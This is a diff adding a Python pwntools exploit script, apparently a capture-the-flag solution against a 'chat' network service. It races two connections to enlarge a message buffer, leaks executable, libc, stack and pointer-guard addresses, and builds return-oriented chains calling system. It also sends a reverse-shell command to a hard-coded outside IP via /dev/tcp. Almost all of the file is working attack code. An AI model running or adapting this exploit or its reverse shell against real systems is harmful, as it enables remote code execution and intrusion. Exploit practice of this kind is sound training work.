@@ -1,0 +1,146 @@
+#!/usr/bin/python3
+
+from pwn import *
+import time
+
+IP = '0'
+PORT = 10000
+
+exe = ELF('chat', checksec=False)
+libc = ELF('libc.so.6', checksec=False)
+context.binary = exe
+
+info = lambda msg: log.info(msg)
+s = lambda proc, data: proc.send(data)
+
+def PTR_MANGLE(var):
+    var ^= pointer_guard
+    return ((var << 0x11) & 0xffffffffffffffff) | (var >> (64 - 0x11))
+
+def recv_msg(p):
+    # Receive name
+    name = b''
+    size = u32(p.recv(4),sign=True)
+    while True:
+        name += p.recv(size-len(name))
+        if len(name)==size:
+            break
+
+    # Receive message
+    msg = b''
+    size = u32(p.recv(4),sign=True)
+    while True:
+        msg += p.recv(size-len(msg))
+        if len(msg)==size:
+            break
+
+    return name, msg
+
+#############################
+### Phase 1: Race to leak ###
+#############################
+# Race condition
+p = process("./chat")
+p1 = remote(IP, PORT)
+p2 = remote(IP, PORT)
+context.terminal = ["foot"]
+gdb.attach(p,gdbscript="")
+# p1 = process("./chat")
+# p2 = process("./chat")
+input("first time send -> ")
+s(p1, p32(0) + p32(1) + p32(0x100))
+# sleep(.25)
+input("second time send -> ")
+s(p2, p32(0) + p32(1) + p32(0x1000))                # Try to change p1 message size to 0x1000
+# sleep(.25)
+input("third time send -> ")
+s(p1, b'0' + b'/bin/sh -i 5<> /dev/tcp/192.168.2.21/9001 0<&5 1>&5 2>&5"\0')             # 127.0.0.1 will connect to docker environ
+s(p2, b'1')
+
+p1.close()
+p2.close()
+
+# Leak addresses
+p = remote(IP, PORT)
+s(p, p32(1))
+name, msg = recv_msg(p)
+p.close()
+
+# Address in received message
+exe_leak = u64(msg[0x108:0x110])
+exe.address = exe_leak - 0x157c
+info("Exe leak: " + hex(exe_leak))
+info("Exe base: " + hex(exe.address))
+main_stack_leak = u64(msg[0x128:0x130])
+info("Main stack leak: " + hex(main_stack_leak))
+libc_leak = u64(msg[0x138:0x140])
+thread1_stack_leak = u64(msg[0x160:0x168])
+info("Thread 1 stack leak: " + hex(thread1_stack_leak))
+if args.REMOTE:
+    libc.address = libc_leak - 0x12bc2d
+else:
+    libc.address = libc_leak - 0x12bc2d
+info("Libc leak: " + hex(libc_leak))
+info("Libc base: " + hex(libc.address))
+pointer_guard = u64(msg[0x9d0:0x9d8])
+info("POINTER_GUARD: " + hex(pointer_guard))
+
+################################
+### Phase 2: Prepare gadgets ###
+################################
+# Race condition
+p1 = remote(IP, PORT)
+p2 = remote(IP, PORT)
+
+s(p1, p32(0) + p32(1) + p32(0x100))
+sleep(.25)
+s(p2, p32(0) + p32(1) + p32(0x1000))                # Try to change p1 message size to 0x1000
+sleep(.25)
+
+# 0x000000000011578c: pop rdi; ret;
+pop_rdi = libc.address + 0x000000000011578c
+pl = fit(
+    pop_rdi, thread1_stack_leak,
+    libc.sym.system
+    )
+s(p1, b'0' + pl)
+s(p2, b'1')
+
+p1.close()
+p2.close()
+
+# Leak stack address of current thread
+p = remote(IP, PORT)
+s(p, p32(1))
+name, msg = recv_msg(p)
+name, msg = recv_msg(p)
+p.close()
+
+thread2_stack_leak = u64(msg[0x160:0x168])
+info("Thread stack leak: " + hex(thread2_stack_leak))
+
+############################
+### Phase 3: ROPChaining ###
+############################
+# Try to race to write data
+p1 = remote(IP, PORT)
+p2 = remote(IP, PORT)
+
+s(p1, p32(0) + p32(1) + p32(0x100))
+sleep(.25)
+s(p2, p32(0) + p32(1) + p32(0x1000))                # Try to change p1 message size to 0x1000
+sleep(.25)
+
+ret = libc.address + 0x00000000001aaeca
+pl = fit({
+        0x128: main_stack_leak,
+        0x150: flat(main_stack_leak, main_stack_leak, main_stack_leak),
+        0x1f0: flat(PTR_MANGLE(thread2_stack_leak), PTR_MANGLE(ret)),
+        })
+s(p1, p64(0)+p64(0x100))
+s(p2, p64(0)+p64(0x1000))
+p1.interactive()
+p1.close()
+p2.close()
+
+
